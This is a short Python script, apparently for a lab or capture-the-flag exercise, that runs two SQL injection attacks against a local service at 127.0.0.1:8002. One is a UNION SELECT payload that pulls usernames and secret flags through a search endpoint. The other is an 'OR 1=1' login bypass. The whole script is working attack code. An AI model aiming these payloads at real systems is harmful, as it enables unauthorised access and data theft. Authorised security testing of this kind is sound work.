"""
Red Team Attack Simulation Script
Executes automated exploit tests against 127.0.0.1:8002
"""

import requests
import json
import time

TARGET_BASE = "http://127.0.0.1:8002"

def test_sqli_search():
    payload = "' UNION SELECT id, username, secret_flag, role FROM users--"
    url = f"{TARGET_BASE}/api/search?q={payload}"
    print(f"\n[+] Testing SQLi Search on {url}")
    try:
        res = requests.get(url, timeout=5)
        print(f"Status: {res.status_code}")
        print("Response:", json.dumps(res.json(), indent=2, ensure_ascii=False))
    except Exception as e:
        print("Error:", e)

def test_login_bypass():
    url = f"{TARGET_BASE}/api/login"
    payload = {"username": "admin' OR 1=1--", "password": "dummy"}
    print(f"\n[+] Testing Login Bypass on {url}")
    try:
        res = requests.post(url, json=payload, timeout=5)
        print(f"Status: {res.status_code}")
        print("Response:", json.dumps(res.json(), indent=2, ensure_ascii=False))
    except Exception as e:
        print("Error:", e)

if __name__ == "__main__":
    print("=== Red Team Attack Suite ===")
    test_sqli_search()
    time.sleep(1)
    test_login_bypass()
